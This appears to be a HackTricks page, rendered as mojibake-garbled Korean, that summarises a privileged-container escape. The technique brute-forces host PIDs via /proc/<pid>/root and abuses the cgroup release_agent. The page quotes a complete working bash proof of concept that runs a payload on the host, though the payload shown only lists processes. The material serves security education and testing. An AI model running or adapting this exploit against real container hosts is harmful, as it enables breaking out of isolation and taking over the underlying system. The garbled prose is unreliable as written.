<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ì„ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **Hacking íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´** [**HackTricks**](https://github.com/carlospolop/hacktricks)ì™€ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì„¸ìš”.

</details>

ìì„¸í•œ ë‚´ìš©ì€ [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)ì˜ ë¸”ë¡œê·¸ í¬ìŠ¤íŠ¸ë¥¼ í™•ì¸í•˜ì„¸ìš”. ì´ê²ƒì€ ìš”ì•½ì…ë‹ˆë‹¤:

ì´ ê¸°ìˆ ì€ Kata Containers ë˜ëŠ” íŠ¹ì • `devicemapper` ì„¤ì •ê³¼ ê°™ì´ ì»¨í…Œì´ë„ˆì˜ íŒŒì¼ ì‹œìŠ¤í…œ ê²½ë¡œë¥¼ ê°€ë¦¬í‚¤ëŠ” ì €ì¥ì†Œ ë“œë¼ì´ë²„ êµ¬ì„±ìœ¼ë¡œ ì¸í•´ í˜¸ìŠ¤íŠ¸ì—ì„œ ì»¨í…Œì´ë„ˆ ë‚´ì—ì„œ í˜¸ìŠ¤íŠ¸ ì½”ë“œë¥¼ ì‹¤í–‰í•˜ëŠ” ë°©ë²•ì„ ì„¤ëª…í•©ë‹ˆë‹¤.

ì£¼ìš” ë‹¨ê³„:

1. **í”„ë¡œì„¸ìŠ¤ ID (PID) ì°¾ê¸°:** Linux ì˜ì‚¬ íŒŒì¼ ì‹œìŠ¤í…œì˜ `/proc/<pid>/root` ì‹¬ë³¼ë¦­ ë§í¬ë¥¼ ì‚¬ìš©í•˜ì—¬ í˜¸ìŠ¤íŠ¸ì˜ íŒŒì¼ ì‹œìŠ¤í…œì— ìƒëŒ€ì ì¸ ì»¨í…Œì´ë„ˆ ë‚´ì˜ ëª¨ë“  íŒŒì¼ì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ í†µí•´ í˜¸ìŠ¤íŠ¸ì—ì„œ ì»¨í…Œì´ë„ˆì˜ íŒŒì¼ ì‹œìŠ¤í…œ ê²½ë¡œë¥¼ ì•Œ í•„ìš”ê°€ ì—†ì–´ì§‘ë‹ˆë‹¤.
2. **PID Bashing:** í˜¸ìŠ¤íŠ¸ì—ì„œ PIDë¥¼ ìˆœì°¨ì ìœ¼ë¡œ í™•ì¸í•˜ì—¬ íŠ¹ì • íŒŒì¼ì´ `/proc/<pid>/root/<file>`ì— ì¡´ì¬í•˜ëŠ”ì§€ í™•ì¸í•˜ëŠ” ë¸Œë£¨íŠ¸ í¬ìŠ¤ ë°©ì‹ì„ ì‚¬ìš©í•©ë‹ˆë‹¤. íŒŒì¼ì´ ë°œê²¬ë˜ë©´ í•´ë‹¹ PIDê°€ ëŒ€ìƒ ì»¨í…Œì´ë„ˆ ë‚´ì—ì„œ ì‹¤í–‰ ì¤‘ì¸ í”„ë¡œì„¸ìŠ¤ì— ì†í•œë‹¤ëŠ” ê²ƒì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤.
3. **ì‹¤í–‰ íŠ¸ë¦¬ê±°:** ì¶”ì¸¡í•œ PID ê²½ë¡œë¥¼ `cgroups release_agent` íŒŒì¼ì— ì‘ì„±í•©ë‹ˆë‹¤. ì´ ì‘ì—…ì€ `release_agent`ì˜ ì‹¤í–‰ì„ íŠ¸ë¦¬ê±°í•©ë‹ˆë‹¤. ì´ ë‹¨ê³„ì˜ ì„±ê³µì€ ì¶œë ¥ íŒŒì¼ì˜ ìƒì„± ì—¬ë¶€ë¡œ í™•ì¸ë©ë‹ˆë‹¤.

### Exploitation Process

Exploitation í”„ë¡œì„¸ìŠ¤ëŠ” ì»¨í…Œì´ë„ˆ ë‚´ì—ì„œ ì‹¤í–‰ ì¤‘ì¸ í”„ë¡œì„¸ìŠ¤ì˜ ì˜¬ë°”ë¥¸ PIDë¥¼ ì¶”ì¸¡í•˜ì—¬ í˜¸ìŠ¤íŠ¸ì—ì„œ í˜ì´ë¡œë“œë¥¼ ì‹¤í–‰í•˜ëŠ” ë” ìì„¸í•œ ì‘ì—… ì§‘í•©ì„ í¬í•¨í•©ë‹ˆë‹¤. ë‹¤ìŒì€ ê·¸ ê³¼ì •ì…ë‹ˆë‹¤:

1. **í™˜ê²½ ì´ˆê¸°í™”:** í˜¸ìŠ¤íŠ¸ì—ì„œ í˜ì´ë¡œë“œ ìŠ¤í¬ë¦½íŠ¸ (`payload.sh`)ë¥¼ ì¤€ë¹„í•˜ê³  cgroup ì¡°ì‘ì„ ìœ„í•œ ê³ ìœ í•œ ë””ë ‰í† ë¦¬ë¥¼ ìƒì„±í•©ë‹ˆë‹¤.
2. **í˜ì´ë¡œë“œ ì¤€ë¹„:** í˜¸ìŠ¤íŠ¸ì—ì„œ ì‹¤í–‰í•  ëª…ë ¹ì„ í¬í•¨í•˜ëŠ” í˜ì´ë¡œë“œ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‘ì„±í•˜ê³  ì‹¤í–‰ ê°€ëŠ¥í•˜ê²Œ ë§Œë“­ë‹ˆë‹¤.
3. **Cgroup ì„¤ì •:** cgroupì„ ë§ˆìš´íŠ¸í•˜ê³  êµ¬ì„±í•©ë‹ˆë‹¤. `notify_on_release` í”Œë˜ê·¸ë¥¼ ì„¤ì •í•˜ì—¬ cgroupì´ í•´ì œë  ë•Œ í˜ì´ë¡œë“œê°€ ì‹¤í–‰ë˜ë„ë¡ í•©ë‹ˆë‹¤.
4. **PID ë¸Œë£¨íŠ¸ í¬ìŠ¤:** ë£¨í”„ë¥¼ í†µí•´ ì ì¬ì ì¸ PIDë¥¼ ë°˜ë³µì ìœ¼ë¡œ í™•ì¸í•˜ê³  ì¶”ì¸¡í•œ ê° PIDë¥¼ `release_agent` íŒŒì¼ì— ì‘ì„±í•©ë‹ˆë‹¤. ì´ë ‡ê²Œ í•˜ë©´ í˜ì´ë¡œë“œ ìŠ¤í¬ë¦½íŠ¸ê°€ `release_agent`ë¡œ ì„¤ì •ë©ë‹ˆë‹¤.
5. **íŠ¸ë¦¬ê±° ë° ì‹¤í–‰ í™•ì¸:** ê° PIDì— ëŒ€í•´ cgroupì˜ `cgroup.procs`ì— ì‘ì„±í•˜ì—¬ PIDê°€ ì˜¬ë°”ë¥¸ ê²½ìš° `release_agent`ê°€ ì‹¤í–‰ë©ë‹ˆë‹¤. í˜ì´ë¡œë“œ ìŠ¤í¬ë¦½íŠ¸ì˜ ì¶œë ¥ì´ ë°œê²¬ë  ë•Œê¹Œì§€ ë£¨í”„ê°€ ê³„ì†ë©ë‹ˆë‹¤. ì´ëŠ” ì„±ê³µì ì¸ ì‹¤í–‰ì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤.


ë¸”ë¡œê·¸ í¬ìŠ¤íŠ¸ì˜ PoC:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ì„ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ì„ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **Hacking íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì„¸ìš”.

</details>
